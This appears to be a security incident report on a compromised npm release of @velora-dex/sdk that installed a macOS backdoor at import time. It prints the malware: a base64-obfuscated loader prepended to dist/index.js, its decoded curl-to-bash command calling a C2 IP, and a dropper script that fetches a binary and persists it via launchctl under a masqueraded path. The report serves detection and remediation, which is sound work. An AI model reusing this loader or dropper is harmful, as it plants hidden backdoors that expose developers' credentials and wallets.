# @velora-dex/sdk — Registry-Only npm Backdoor, macOS launchctl Persistence

**Date:** April 2026
**Ecosystem:** npm
**Severity:** High
**Type:** Registry-only injection / Import-time execution / macOS Backdoor
**Sources:**
- [StepSecurity — @velora-dex/sdk Compromised on npm: Malicious Version Drops macOS Backdoor via launchctl Persistence](https://www.stepsecurity.io/blog/velora-dex-sdk-compromised-on-npm-malicious-version-drops-macos-backdoor-via-launchctl-persistence)

---

## Summary

On April 7, 2026, a malicious version of `@velora-dex/sdk` (v9.4.1) was published to npm. VeloraDEX is a DeFi toolkit used for token swaps, limit orders, and delta trading on the VeloraDEX decentralized exchange platform. The attack was first reported by Charlie Eriksen of Aikido Security via GitHub issue #233.

The compromised version contains three lines of malicious code prepended directly to `dist/index.js`. Crucially, the payload executes **at import time** — the moment any code calls `require('@velora-dex/sdk')` — rather than relying on a postinstall hook. This bypasses protections such as `npm install --ignore-scripts`. The injected code downloads a shell script from a C2 server at `89.36.224.5`, which drops an architecture-specific macOS binary and registers it as a persistent service via `launchctl`. No changes were pushed to the project's GitHub repository; the malicious version was crafted and published entirely outside the normal CI/CD pipeline.

The attack is targeted squarely at macOS developer machines. On Linux (including GitHub Actions runners), the shell script contacts the C2 but skips the binary download. Any developer who imported the package on macOS should treat their machine and all accessible secrets as fully compromised.

---

## Compromised Artifacts

| Package | Malicious Version | Safe Version |
|---------|------------------|--------------|
| `@velora-dex/sdk` | 9.4.1 | 9.4.0 (pin to this or earlier) |

**Differences between v9.4.0 and v9.4.1 (registry-only, no repo commit):**
- `package.json` — version bump only
- `dist/index.js` — three malicious lines prepended; all other files identical

---

## How It Worked

### Step 1 — Registry-Only Code Injection

The attacker published v9.4.1 directly to npm without making any corresponding changes to the GitHub repository. Diffing the published tarballs of v9.4.0 and v9.4.1 reveals exactly two modified files. This "registry-only" pattern is a key forensic indicator: the malicious build was crafted and published manually, bypassing the project's CI/CD pipeline entirely. The absence of a matching git tag or commit in the source repo is the primary signal.

### Step 2 — Import-Time Payload in dist/index.js

Three lines were prepended to the package's main entry point (`dist/index.js`) before all legitimate code:

```javascript
'use strict'
const {exec} = require('child_process');
exec(`echo 'bm9odXAgYmFzaCAtYyAiJChjdXJsIC1mc1NMIGh0dHA6Ly84OS4zNi4yMjQuNS90cm91Ymxlc2hvb3QvbWFjL2luc3RhbGwuc2gpIiA+IC9kZXYvbnVsbCAyPiYx' | (base64 --decode 2>/dev/null || base64 -D) | bash`, function(error, stdout, stderr) {});
```

The base64 string decodes to:

```
nohup bash -c "$(curl -fsSL http://89.36.224.5/troubleshoot/mac/install.sh)" > /dev/null 2>&1
```

Notable evasion properties:
- **Import-time execution** — fires on the first `require()` or `import`, not on `npm install`
- **`nohup`** — detaches the shell from the Node.js parent process; survives parent exit
- **`> /dev/null 2>&1`** — all output suppressed; user sees nothing
- **Dual base64 flag** — `(base64 --decode 2>/dev/null || base64 -D)` handles both Linux (`--decode`) and macOS (`-D`) variants

Total time from import to persistence attempt: ~330ms.

### Step 3 — install.sh Dropper

StepSecurity captured the full `install.sh` payload via Harden-Runner process monitoring:

```bash
TERMINAL_DIR="$HOME/Library/Application Support/com.apple.Terminal"
PROFILER_PATH="$TERMINAL_DIR/profiler"
mkdir -p "$TERMINAL_DIR"
if [[ "$(uname)" == "Darwin" ]]; then
  if [[ "$(uname -m)" == "arm64" ]]; then
    curl -fso "$PROFILER_PATH" http://89.36.224.5/mac/arm/driver/profiler
  else
    curl -fso "$PROFILER_PATH" http://89.36.224.5/mac/intel/driver/profiler
  fi
fi
chmod +x "$PROFILER_PATH"
launchctl submit -l zsh.profiler -- "$PROFILER_PATH"
```

**Evasion techniques:**

- **Path masquerading** — drops to `~/Library/Application Support/com.apple.Terminal/`, which mimics a legitimate macOS system path a developer reviewing the filesystem would likely skip
- **Benign binary naming** — the malware binary is named `profiler`, blending in with standard system tooling
- **Architecture-aware delivery** — separate binaries for Apple Silicon (ARM64) and Intel (x86_64), ensuring native execution without Rosetta overhead
- **`launchctl` user-space persistence** — the service `zsh.profiler` survives reboots without elevated privileges
- **Darwin guard** — binary download only triggers on macOS; Linux runners make the C2 contact but skip the binary download

### C2 and Process Tree

The full kill chain captured by Harden-Runner on a Linux GitHub Actions runner:

```
node (PID 2379)            // require('@velora-dex/sdk')
  /bin/sh (PID 2386)       // echo '...' | base64 --decode | bash
    base64 (PID 2390)      // --decode
    bash (PID 2389)
      curl (PID 2391)      // -fsSL http://89.36.224.5/troubleshoot/mac/install.sh
      nohup bash (PID 2393) // executes install.sh
        mkdir (PID 2394)   // -p ~/Library/Application Support/com.apple.Terminal
        uname (PID 2395)   // checks for Darwin
        chmod (PID 2396)   // +x .../profiler
```

The C2 contact (curl to `89.36.224.5:80`) occurs during the `require()` call — not during installation — confirming import-time triggering.

---

## Timeline

| Date/Time (UTC) | Event |
|-----------------|-------|
| 2026-04-07 | `@velora-dex/sdk@9.4.1` published to npm with malicious `dist/index.js` |
| 2026-04-07 | Charlie Eriksen (Aikido Security) reports the compromise in GitHub issue #233 |
| 2026-04-07 | StepSecurity publishes full analysis including captured install.sh payload and Harden-Runner network evidence |
| 2026-04-07 | StepSecurity adds `@velora-dex/sdk@9.4.1` to their Compromised Package Check blocklist |

---

## Detection

```bash
# Check if the compromised version is installed
npm list @velora-dex/sdk 2>/dev/null | grep 9.4.1

# Search for the compromised version in lockfiles
grep -r "velora-dex/sdk" --include="package-lock.json" \
  --include="yarn.lock" --include="pnpm-lock.yaml" .

# Check for the dropped binary on macOS
ls -la ~/Library/Application\ Support/com.apple.Terminal/profiler

# Check for the launchctl persistence service on macOS
launchctl list | grep zsh.profiler

# Check npm cache for the compromised tarball
find ~/.npm/_cacache -name "*.tgz" 2>/dev/null | \
  xargs strings 2>/dev/null | grep "89.36.224.5"

# Check firewall/proxy logs for C2 contact
# (Any outbound connection to 89.36.224.5 on port 80 confirms payload fired)
grep "89.36.224.5" /var/log/firewall.log 2>/dev/null
```

---

## Remediation

1. **Pin to a safe version**: `npm install @velora-dex/sdk@9.4.0`
2. **Stop and remove the launchctl persistence service (macOS)**:
   ```bash
   launchctl remove zsh.profiler
   ```
3. **Remove the dropped binary (macOS)**:
   ```bash
   rm -rf ~/Library/Application\ Support/com.apple.Terminal/profiler
   rmdir ~/Library/Application\ Support/com.apple.Terminal 2>/dev/null
   ```
4. **Rotate all credentials** present on the affected machine at import time — treat as fully compromised:
   - npm tokens and GitHub PATs
   - SSH keys (`~/.ssh/`)
   - Cloud provider credentials (AWS, GCP, Azure)
   - Environment variables containing API keys
   - Browser-stored passwords and cookies
   - Cryptocurrency wallet keys and seed phrases
5. **Review network logs** for outbound connections to `89.36.224.5`; any match confirms payload execution
6. **Audit CI/CD logs** for Harden-Runner or network proxy records showing connections to this IP during workflow runs

---

## Lessons Learned

- **Postinstall-bypass via import-time execution**: Disabling postinstall scripts (`--ignore-scripts`) is no defence against payloads injected directly into the package's main entry point. Security tooling must inspect what happens at `require()` / `import`, not just at install.
- **Registry vs. repository divergence is a key signal**: The absence of a matching git commit or tag for a published version is a strong indicator of a registry-only attack. Tools that compare npm registry content to the source repo (e.g., Harden-Runner's Package Cooldown Check) can catch this before adoption.
- **macOS-targeted supply chain attacks are rising**: Unlike many attacks that target Linux CI runners, this payload was designed specifically for macOS developer machines, using Apple-specific paths, `launchctl` persistence, and architecture-aware binary delivery.
- **DeFi ecosystem packages are high-value targets**: Packages used in DeFi/Web3 toolchains sit on developer machines that may also hold cryptocurrency keys, wallet seed phrases, and exchange credentials — making them disproportionately valuable to attackers.
- **Path masquerading defeats casual inspection**: Placing a malicious binary inside `~/Library/Application Support/com.apple.Terminal/` exploits the natural human tendency to skip directories that look like legitimate system paths.

---

## Related Incidents

- [./2026-03-axios-npm-rat.md](./2026-03-axios-npm-rat.md) — Account takeover + import-time RAT via injected dependency
- [./2026-01-dydx-npm-pypi.md](./2026-01-dydx-npm-pypi.md) — DeFi SDK compromise; crypto wallet stealer
- [./2026-01-gwagon-npm-infostealer.md](./2026-01-gwagon-npm-infostealer.md) — npm infostealer targeting 100+ crypto wallets
